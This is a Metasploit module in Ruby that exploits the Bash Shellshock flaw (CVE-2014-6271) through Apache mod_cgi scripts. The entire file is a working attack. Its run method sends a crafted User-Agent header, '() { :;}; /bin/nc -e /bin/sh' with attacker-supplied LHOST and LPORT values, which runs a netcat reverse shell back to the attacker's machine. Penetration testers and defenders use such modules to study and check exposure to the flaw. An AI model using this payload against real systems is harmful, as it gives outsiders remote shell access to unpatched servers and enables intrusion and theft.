##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Bash Specially-Crafted Environment Variables Code Injection Attack via Apache mod_cgi',
      'Description' => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting Apache mod_cgi scripts through
        the HTTP_USER_AGENT variable.

        Netcat with the -e (GAPING_SECURITY_HOLE) option is required.
      },
      'Author' => [
        'Stephane Chazelas', # Vulnerability discovery
        'wvu' # Metasploit module
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
      ],
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptAddress.new('LHOST', [true, 'Local host for reverse shell']),
      OptPort.new('LPORT', [true, 'Local port for reverse shell'])
    ], self.class)
  end

  def run
    begin
      send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'agent' => "() { :;}; /bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &"
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
  end

end
